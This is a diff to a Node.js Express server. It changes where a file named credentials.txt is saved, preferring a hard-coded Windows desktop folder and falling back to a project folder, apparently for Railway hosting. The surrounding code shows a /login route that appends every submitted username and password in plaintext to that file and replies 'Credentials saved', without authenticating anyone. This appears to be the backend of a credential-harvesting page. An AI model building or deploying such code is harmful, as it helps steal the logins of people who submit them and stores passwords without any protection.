@@ -5,11 +5,20 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ---- Use a relative path inside the project ----
-const SAVE_DIR = path.join(__dirname, 'data');
+// ---- Path logic: try the Windows desktop folder first ----
+const WINDOWS_PATH = 'C:\\Users\\donut\\Desktop\\data';
+let SAVE_DIR;
+
+if (fs.existsSync(WINDOWS_PATH)) {
+  SAVE_DIR = WINDOWS_PATH;
+} else {
+  // On Railway or any other environment – use a relative folder inside the project
+  SAVE_DIR = path.join(__dirname, 'data');
+}
+
 const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');
 
-// Ensure the directory exists (recursive: true creates parent folders if needed)
+// Ensure the directory exists (recursive: true creates parent folders)
 if (!fs.existsSync(SAVE_DIR)) {
   fs.mkdirSync(SAVE_DIR, { recursive: true });
 }
@@ -34,7 +43,6 @@ app.post('/login', (req, res) => {
   const logLine = `[${timestamp}] Username: ${username} | Password: ${password}\n`;
 
   try {
-    // Append to file – creates the file if it doesn't exist
     fs.appendFileSync(SAVE_FILE, logLine, 'utf8');
     res.json({ success: true, message: 'Credentials saved' });
   } catch (err) {
